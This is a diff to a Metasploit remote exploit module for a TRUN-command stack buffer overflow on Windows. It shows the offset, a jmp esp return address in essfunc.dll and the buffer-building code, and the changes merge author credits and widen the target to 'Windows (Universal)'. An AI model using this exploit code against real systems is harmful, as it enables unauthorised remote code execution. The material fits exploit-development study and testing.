@@ -23,8 +23,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'License'    => MSF_LICENSE,
       'Author'    =>
         [
-        'Nate Jernigan',  # Original discovery
-        'Nate Jernigan',  # MSF Module
+        'Nate Jernigan',  # Original discovery and MSF Module
         ],
       'References'  => [
             [ 'URL', 'https://github.com/DataandGoliath/DEV/DEV-BO-VOO1' ]
@@ -45,7 +44,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
       'Targets'    =>
         [
-          [ 'Windows 10',
+          [ 'Windows (Universal)', #Exploit proved successful without modification on XP, Win7, and Win10
             {
               'Ret'     =>  0x625011af, # jmp esp - essfunc.dll
               'Offset'  =>  2003
@@ -66,7 +65,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
 
     connect
-    buffer = "TRUN /.:/"
+    buffer = "TRUN /.:/" #then next line w/ << rather than =
     buffer <<  rand_text(target['Offset'])
     buffer << [target.ret].pack('V')
     buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption
